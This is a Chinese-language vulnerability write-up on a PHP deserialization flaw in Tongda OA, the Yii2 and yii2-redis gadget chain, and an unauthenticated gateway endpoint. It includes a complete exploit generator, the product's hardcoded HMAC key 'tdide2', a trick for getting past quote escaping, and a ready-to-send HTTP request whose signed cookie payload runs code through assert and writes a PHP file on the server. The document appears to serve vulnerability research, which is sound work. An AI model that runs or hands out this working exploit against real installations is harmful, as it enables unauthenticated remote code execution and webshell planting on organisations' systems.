通达OA反序列化分析
==========

0x01 环境搭建
---------

这个漏洞最关键的还是链子，首先通达OA使用的是Yii2.0.13版本，使用了Yii-redis组件

使用的Yii版本在\\inc\\vendor\\yii2\\yiisoft\\yii2\\BaseYii.php里面能看到

Yii-redis的版本在\\inc\\vendor\\yii2\\yiisoft\\extensions.php里面可以看到为2.0.6

<https://github.com/yiisoft/yii2/releases/tag/2.0.13>

<https://github.com/yiisoft/yii2-redis/releases/tag/2.0.6>

下载到对应的源码

直接用phpstudy，下载好的Yii源码直接解压到网站目录下

首先是Yii的配置，需要修改\\config\\web.php中的cookieValidationKey值，随便改一个就好

在通达OA里面这个值为tdide2后续会用到记住就好

然后将Yii-redis解压到\\vendor\\yiisoft\\yii2\\redis下面

然后配置\\vendor\\yiisoft\\extensions.php

```php
<?php

$vendorDir = dirname(__DIR__);

return array (
    'yiisoft/yii2/redis' =>
        array (
            'name' => 'yiisoft/yii2/redis',
            'version' => '2.0.6',
            'alias' =>
                array (
                    '@yii/redis' => $vendorDir . '/yiisoft/yii2/redis',
                ),
        ),
  'yiisoft/yii2-swiftmailer' => 
  array (
    'name' => 'yiisoft/yii2-swiftmailer',
    'version' => '2.0.7.0',
    'alias' => 
    array (
      '@yii/swiftmailer' => $vendorDir . '/yiisoft/yii2-swiftmailer',
    ),
  ),
  //..........这里就不贴了加在前面就好
);
```

可以在控制器里面加一个反序列化的口子用来调试

创建\\controllers\\TestController.php

```php
<?php

namespace app\controllers;

use yii\web\Controller;

class TestController extends Controller
{
    private $_events = ["beforeAction"=>"0"];
    public function actionIndex()
    {
        $un = $_GET["un"];
        $a = unserialize($un);
        return "poc";
    }

    public function actionPhp()
    {
        echo "php";
    }
}
```

[http://127.0.0.1:8081/index.php?r=test%252Findex&amp;un](http://127.0.0.1:8081/index.php?r=test%252Findex&un)=...

这样就能debug了

到这里配置就完成了

0x02 反序列化链
----------

在分析文章中exp没有全部打码，还是能看到一些信息的，比如使用了redisCommands属性

根据这个来找很容易就能知道这条链使用了Connection.php里面的类

接下来就是看看怎么走通了

可能有些师傅没看过Yii反序列化的链子所以这里从头讲起

注意下载的Yii的vendor下面有很多别的类，但是在通达里面都是没有的，这也是网上的链条用不了的原因

触发点为\\vendor\\yiisoft\\yii2\\db\\BatchQueryResult.php里面的\_\_destruct方法

这也是很多低版本Yii反序列化开始的点

![1.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-f147cfca3aafdad4f968dda8f19a230f22f0f539.png)

触发\_\_destruct方法调用reset函数

$this-&gt;\_dataReader可控，该参数不为null调用该参数的close函数

这里可以找有close方法的类，也可以找\_\_call方法

这里先找有close方法的类

找到\\vendor\\yiisoft\\yii2\\db\\DataReader.php的close方法

```php
    public function close()
    {
        $this->_statement->closeCursor();
        $this->_closed = true;
    }
```

$this-&gt;\_statement调用closeCursor()这次找\_\_call方法

选择redis里的Connection.php类的\_\_call方法

```php
public function __call($name, $params)
    {
        $redisCommand = strtoupper(Inflector::camel2words($name, false));
        if (in_array($redisCommand, $this->redisCommands)) {
            return $this->executeCommand($redisCommand, $params);
        } else {
            return parent::__call($name, $params);
        }
    }
```

因为Connection.php也存在close方法所以不能直接到这里

看代码得知先经过一个方法得到$redisCommand

然后判断$redisCommand是否在$this-&gt;redisCommands数组里

先看看$redisCommand的值是什么

```php
public static function camel2words($name, $ucwords = true)
    {
        $label = strtolower(trim(str_replace([
            '-',
            '_',
            '.',
        ], ' ', preg_replace('/(?<![A-Z])[A-Z]/', ' \0', $name))));

        return $ucwords ? ucwords($label) : $label;
    }
//$name=closeCursor, $ucwords=fasle;
//先正则匹配前面不为大写字母的，替换为 \0，php里面\0好像不会吧字符吃掉，会变成close Cursor
//没有需要替换和去除左右空格
//全小写得到close cursor，false直接返回
```

出来后又全大写变成CLOSE CURSOR

所以$this-&gt;redisCommands = \["CLOSE CURSOR"\];

绕过这个判断执行到executeCommand方法

![2.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-52b951c698000dc94ab899611cf9396c0c38a9f5.png)

第一步走到open方法

![3.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-e62622501139e9409bec8e6c9486917579d6c219.png)

第一个判断需要$this-&gt;\_socket=false

接下来是一个拼接字符串，这里可以去找\_\_toString可是没找到好用的

然后stream\_socket\_client打开连接

这里$this-&gt;unixSocket要为false，因为通达OA都是windows的不能使用unix协议，连接失败返回false就走不下去了，当然不用特意写，unixSocket为空本身就是false

后面的$this-&gt;hostname自带的值为localhost

$this-&gt;port需要指定一下，写一个能通的端口就行，windows有些默认开着的端口可以利用一下

连接成功走过下一个判断

dataTimeout，password，database都不要填写，不需要走进这些判断

直接走到initConnection()

```php
protected function initConnection()
    {
        $this->trigger(self::EVENT_AFTER_OPEN);
    }
//    const EVENT_AFTER_OPEN = 'afterOpen';
```

再看trigger，该方法在父类Component里面

![4.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-7036816a918694cf520f7b53f21b627f26a94054.png)

看到了call\_user\_func应该就是这里了

ensureBehaviors方法不需要看没有影响

$this-&gt;\_events\[$name\]需要不为空

这里的$name是self::EVENT\_AFTER\_OPEN

$this-&gt;\_events是Component类的不要和前面看混了

所以$this-&gt;\_events\["afterOpen"\]需要有值，至于是什么值还要往下看

直接看到foreach循环$this-&gt;\_events\["afterOpen"\]内容，所以值需要为数组

取出的值取元素所以是数组里面还要数组

$handler\[0\]在指定调用什么函数，低版本yii直接去找\\vendor\\yiisoft\\yii2\\rest\\CreateAction.php的run方法

![5.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-958c993683c10bab216e63258f6dd1d45361634c.png)

最上面的call\_user\_func的参数都可控实现代码执行

```php
$this->_events = ["afterOpen" => [[[new CreateAction(), "run"], "run"]]];
```

链子到这里就结束了，头和尾和普通的链子是一样的，中间用了redis组件，好在作者打码少得到了中间利用的类

调用栈

![6.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-4e64d5b6c44528d030f405910df812ff1226b77a.png)

0x03 漏洞分析
---------

漏洞地址是http://ip/general/appbuilder/web/portal/gateway/?

先看这个文件\\general\\appbuilder\\web\\index.php

![7.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-d067ea574a3b4603ad4751472a1f59528bccf7b4.png)

该段代码会先获取url

用?截取url，检查url字符串是否存在/portal/有则走到第一个判断

如果没有/gateway/，/gateway/saveportal，edit，返回首页

漏洞地址正好满足这些要求，可以绕过鉴权，显示Yii默认的view

位置在\\general\\appbuilder\\views\\layouts\\main.php

![8.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-5e33a4df7e1933452b48124cace60f0e8c0104be.png)

视图代码中有csrfMetaTags方法

因为这里是zend解密后的代码，所以看起来有怪，该方法是Yii自带的方法，如果需要调试可以直接拿Yii来调

找到csrfMetaTags方法

该方法在\\inc\\vendor\\yii2\\yiisoft\\yii2\\helpers\\BaseHtml.php

![9.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-d630d0a85947994da91b33efcbda975e7e9bed90.png)

里面又调用了getCsrfToken方法，该方法在\\inc\\vendor\\yii2\\yiisoft\\yii2\\web\\Request.php

```php
    public function getCsrfToken($regenerate)
    {
        if (($this->_csrfToken === web\null) || $regenerate) {
            if ($regenerate || (($token = $this->loadCsrfToken()) === web\null)) {
                $token = $this->generateCsrfToken();
            }

            $this->_csrfToken = Yii::$app->security->maskToken($token);
        }

        return $this->_csrfToken;
    }
```

里面调用了loadCsrfToken方法

```php
    protected function loadCsrfToken()
    {
        if ($this->enableCsrfCookie) {
            return $this->getCookies()->getValue($this->csrfParam);
        }

        return Yii::$app->getSession()->get($this->csrfParam);
    }
```

再调用getCookies方法

```php
    public function getCookies()
    {
        if ($this->_cookies === web\null) {
            $this->_cookies = new web\CookieCollection($this->loadCookies(), array("readOnly" => web\true));
        }

        return $this->_cookies;
    }
```

最后调用了loadCookies方法

![10.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-201e6f4100aa86ce01242a1dbf052585f15bf7c2.png)

反序列化点就在这里，方法前面有什么web不用管因为是解密出来的，直接去Yii看就是正常的

注意传进来的$data需要经过validateData方法

该方法在\\inc\\vendor\\yii2\\yiisoft\\yii2\\base\\Security.php

因为这个方法需要看一下所以就去Yii里面拿了

这里本意应该是防止csrf的，所以传进来的值是实际上是hash+序列化值

```php
    public function validateData($data, $key, $rawHash = false)
    {
        $test = @hash_hmac($this->macHash, '', '', $rawHash);
        //$this->macHash="sha256"
        //随意加密一串hash因为长度是一样的，这个就是用来得到长度截取的Cookie用的，加密方式为sha256
        if (!$test) {
            throw new InvalidConfigException('Failed to generate HMAC with hash algorithm: ' . $this->macHash);
        }
        $hashLength = StringHelper::byteLength($test);
        //得到hash的长度
        if (StringHelper::byteLength($data) >= $hashLength) {
            //如果完整的Cookie的值长度大于等于hash的长度走到这里
            $hash = StringHelper::byteSubstr($data, 0, $hashLength);
            //这里是截取Cookie的里的hash
            $pureData = StringHelper::byteSubstr($data, $hashLength, null);
            //这里是截取序列化的值
            $calculatedHash = hash_hmac($this->macHash, $pureData, $key, $rawHash);
            //将序列化的值sha256加密，$key值为cookieValidationKey，也就是上面提到过的tdide2
            if ($this->compareString($hash, $calculatedHash)) {
                //这是个对比的函数，对比截取到的hash和上一条语句加密的hash是否相同，相同返回序列化的内容，不同返回false
                return $pureData;
            }
        }

        return false;
    }
```

再看到上面$data不为false就执行反序列化触发漏洞

通达OA是全局变量过滤的，反序列化的payload里面会有双引号要被转义，这是需要解决的问题

相关代码在\\inc\\common.inc.php

![11.png](https://shs3.b.qianxin.com/attack_forum/2023/08/attach-f1337a3335330421bb4c3e878619e49f5be47ce3.png)

好在代码里可以看到\_GET这些是不经过addslashes函数的，只要取这些当作参数就可以绕过了

0x04 EXP
--------

```php
<?php

namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct()
        {
            $this->checkAccess = "assert";
            $this->id = "file_put_contents('a.php','TONGDA')";
            //代码执行写shell
        }
    }
}

namespace yii\base{

    use yii\rest\CreateAction;
    class Component{
        private $_events = [];

        public function __construct()
        {
             $this->_events = ["afterOpen" => [[[new CreateAction(), "run"], "run"]]];
            //使用CreateAction的run函数
        }
    }
}

namespace yii\redis{
    use yii\base\Component;
    class Connection extends Component{
        public $redisCommands;
        public $database = null;
        public $port = 0;
        private $_socket = false;

        public function __construct()
        {
            $this->redisCommands = ["CLOSE CURSOR"];
            //绕过__call内判断
            $this->database = null;
            //正常情况database=0
            //要改为null不然在open里面会走进判断，dataTimeout和password本身就为null所以不用设置
            $this->port = 80;
            //这里需要修改为可以访问的端口，靶机里面80是开放的所以就写80了，按实际情况改
            parent::__construct();
            //上面说到过Component里面有_events，调用父类构造函数将Component的_events赋值

        }
    }
}

namespace yii\db{

    use yii\redis\Connection;
    class DataReader{
        private $_statement;

        public function __construct()
        {
            $this->_statement = new Connection();
            //调用Connection内的__call方法
        }
    }
    class BatchQueryResult{
        private $_dataReader;

        public function __construct()
        {
            $this->_dataReader = new DataReader();
            //去找close方法
        }
    }
}

namespace {
    use yii\db\BatchQueryResult;
    $data = serialize(new BatchQueryResult());
    $crypt = hash_hmac("sha256",$data,"tdide2",false);
    $data = urlencode($data);
    $payload = $crypt . $data;
    echo $payload;
}
```

数据包

```php
GET /general/appbuilder/web/portal/gateway/? HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _GET=30c8273d6cc86774871722e1b893260ca17813f62cf627a5e1dd1a342861e00eO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A1%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A5%3A%7Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A8%3A%22database%22%3BN%3Bs%3A4%3A%22port%22%3Bi%3A80%3Bs%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Bs%3A6%3A%22assert%22%3Bs%3A2%3A%22id%22%3Bs%3A35%3A%22file_put_contents%28%27a.php%27%2C%27TONGDA%27%29%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7D%7D%7D
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

访问http://ip/general/appbuilder/web/a.php存在漏洞利用成功

0x05 参考
-------

<https://www.ctfiot.com/128812.html>